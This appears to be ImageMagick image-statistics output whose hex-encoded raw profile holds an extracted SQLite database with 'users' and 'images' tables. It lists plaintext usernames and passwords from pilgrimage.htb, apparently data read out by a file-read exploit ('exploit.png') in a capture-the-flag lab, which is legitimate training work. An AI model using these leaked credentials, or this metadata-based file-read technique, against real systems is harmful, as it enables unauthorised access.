+      standard deviation: 73.8482 (0.289601)
+      kurtosis: -1.20334
+      skewness: 4.86834e-13
+      entropy: 1
+    Green:
+      min: 0  (0)
+      max: 254 (0.996078)
+      mean: 43.0449 (0.168804)
+      standard deviation: 60.431 (0.236984)
+      kurtosis: 0.701623
+      skewness: 1.3265
+      entropy: 0.620203
+    Blue:
+      min: 1  (0.00392157)
+      max: 253 (0.992157)
+      mean: 127 (0.498039)
+      standard deviation: 73.8482 (0.289601)
+      kurtosis: -1.20334
+      skewness: 2.05705e-14
+      entropy: 1
+  Image statistics:
+    Overall:
+      min: 0  (0)
+      max: 254 (0.996078)
+      mean: 99.015 (0.388294)
+      standard deviation: 69.3758 (0.272062)
+      kurtosis: -1.20718
+      skewness: 0.300562
+      entropy: 0.873401
+  Rendering intent: Perceptual
+  Gamma: 0.45455
+  Chromaticity:
+    red primary: (0.64,0.33)
+    green primary: (0.3,0.6)
+    blue primary: (0.15,0.06)
+    white point: (0.3127,0.329)
+  Background color: white
+  Border color: srgb(223,223,223)
+  Matte color: grey74
+  Transparent color: black
+  Interlace: None
+  Intensity: Undefined
+  Compose: Over
+  Page geometry: 128x128+0+0
+  Dispose: Undefined
+  Iterations: 0
+  Compression: Zip
+  Orientation: Undefined
+  Properties:
+    date:create: 2023-07-21T20:59:08+00:00
+    date:modify: 2023-07-21T20:58:59+00:00
+    date:timestamp: 2023-07-21T20:58:59+00:00
+    png:bKGD: chunk was found (see Background color, above)
+    png:cHRM: chunk was found (see Chromaticity, above)
+    png:gAMA: gamma=0.45455 (See Gamma, above)
+    png:IHDR.bit-depth-orig: 8
+    png:IHDR.bit_depth: 8
+    png:IHDR.color-type-orig: 2
+    png:IHDR.color_type: 2 (Truecolor)
+    png:IHDR.interlace_method: 0 (Not interlaced)
+    png:IHDR.width,height: 128, 128
+    png:sRGB: intent=0 (Perceptual Intent)
+    png:text: 4 tEXt/zTXt/iTXt chunks were found
+    png:tIME: 2023-07-21T20:58:59Z
+    Raw profile type: 
+
+   20480
+53514c69746520666f726d61742033001000010100402020000000b30000000500000000
+000000000000000400000004000000000000000000000001000000000000000000000000
+0000000000000000000000000000000000000000000000b3002e4b910d0ff800040eba00
+0f650fcd0eba0f3800000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+00000000000000000000000000000000000000000000000000007c030717191901815374
+61626c65696d61676573696d6167657304435245415445205441424c4520696d61676573
+202875726c2054455854205052494d415259204b4559204e4f54204e554c4c2c206f7269
+67696e616c2054455854204e4f54204e554c4c2c20757365726e616d652054455854204e
+4f54204e554c4c292b0406173f190100696e64657873716c6974655f6175746f696e6465
+785f696d616765735f31696d616765730566010717171701812b7461626c657573657273
+757365727302435245415445205441424c452075736572732028757365726e616d652054
+455854205052494d415259204b4559204e4f54204e554c4c2c2070617373776f72642054
+455854204e4f54204e554c4c29290206173d170100696e64657873716c6974655f617574
+6f696e6465785f75736572735f3175736572730300000008000000000d000000060fa200
+0fe60fdd0fce0fbc0faf0fa2000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000b06
+03151575736572757365720b05031515726f6f74726f6f74100403171d77697474797769
+7474793132330d0303171761646d696e61646d696e070203130fc3a42727180103172d65
+6d696c796162696763686f6e6b79626f693132330a000000060fc9000fe50ff70fd20fc9
+0fdb0fef0000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000008031501757365
+720608031501726f6f7405090317017769747479040903170161646d696e0307031301c3
+a4270208031709656d696c790d000000020f47000f8b0f47000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000042
+0204692317687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f3634
+62616630393634373561342e706e676578706c6f69742e706e6777697474797301056981
+0713687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f3634626165
+33666566316138342e706e67417070726f7665642d7374616d702d696c6c757374726174
+696f6e2d6f6e2d7472616e73706172656e742d6261636b67726f756e642d504e472e706e
+67c3a4270a000000020f9b000fce0f9b0000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000
